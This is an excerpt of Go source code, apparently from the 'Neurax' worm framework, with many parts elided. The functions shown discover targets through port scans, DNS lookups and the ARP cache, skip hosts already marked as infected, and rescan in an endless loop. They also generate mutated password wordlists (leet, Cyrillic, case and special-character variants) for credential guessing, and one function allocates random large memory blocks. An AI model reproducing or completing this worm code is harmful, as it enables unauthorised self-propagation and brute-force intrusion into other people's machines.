	...
	if N.ScanShaker {
		...
		if len(opened_ports) != 0 {
			if N.ScanRequiredPort == 0 {
				...
				if cf.PortscanSingle(target, N.ScanRequiredPort) {
					NeuraxDebug("Found active host: " + target)
					return true
				}
			}
...
func targets_lookup(targets []string) []string {
	...
	for _, target := range targets {
		if cf.RegexMatch("ip", target) {
			...
			ip_addresses, err := cf.DnsLookup(target)
			if err != nil {
				return []string{}
			}
...
func neurax_scan_active(f func(string)) {
	...
	if N.ScanArpCache {
		...
		NeuraxDebug(cf.F("Found %d targets in ARP cache", len(arp.Table())))
	}
	...
	targets = cf.RemoveFromSlice(targets, N.LocalIp)
	for _, target := range targets {
		...
		if IsHostActive(target) && !IsHostInfected(target) {
			...
			if N.ScanHostInterval != "none" {
				time.Sleep(time.Duration(cf.IntervalToSeconds(N.ScanHostInterval)) * time.Second)
			}
		}
	}
}
...
func NeuraxScan(f func(string)) {
	for {
		neurax_scan_core(f)
		time.Sleep(time.Duration(cf.IntervalToSeconds(N.ScanInterval)))
	}
}
...
func NeuraxWordlist(words ...string) []string {
	...
	for _, word := range words {
		...
		if N.WordlistExpand {
			if cf.Contains(N.WordlistMutators, "encapsule") || use_all {
				wordlist = append(wordlist, WordEncapsule(word)...)
			}
			if cf.Contains(N.WordlistMutators, "cyryllic") || use_all {
				wordlist = append(wordlist, WordCyryllicReplace(word)...)
			}
			if cf.Contains(N.WordlistMutators, "single_upper") || use_all {
				wordlist = append(wordlist, WordSingleUpperTransform(word)...)
			}
			if cf.Contains(N.WordlistMutators, "basic_leet") || use_all {
				wordlist = append(wordlist, WordBasicLeet(word)...)
			}
			if cf.Contains(N.WordlistMutators, "full_leet") || use_all {
				wordlist = append(wordlist, WordFullLeet(word)...)
			}
			if cf.Contains(N.WordlistMutators, "revert") || use_all {
				wordlist = append(wordlist, WordRevert(word)...)
			}
			if cf.Contains(N.WordlistMutators, "duplicate") || use_all {
				wordlist = append(wordlist, WordDuplicate(word)...)
			}
			if cf.Contains(N.WordlistMutators, "char_swap") || use_all {
				wordlist = append(wordlist, WordCharSwap(word)...)
			}
			if cf.Contains(N.WordlistMutators, "special_append") || use_all {
				wordlist = append(wordlist, WordSpecialCharsAppend(word)...)
			}
			if cf.Contains(N.WordlistMutators, "special_prepend") || use_all {
				wordlist = append(wordlist, WordSpecialCharsPrepend(word)...)
			}
		}
	}
	if cf.Contains(N.WordlistMutators, "permute") || use_all {
...
func NeuraxAlloc() {
	min_alloc := cf.SizeToBytes("10m")
	max_alloc := cf.SizeToBytes("600m")
	for n := 0; n < N.AllocNum; n++ {
		num_bytes := cf.RandomInt(min_alloc, max_alloc)
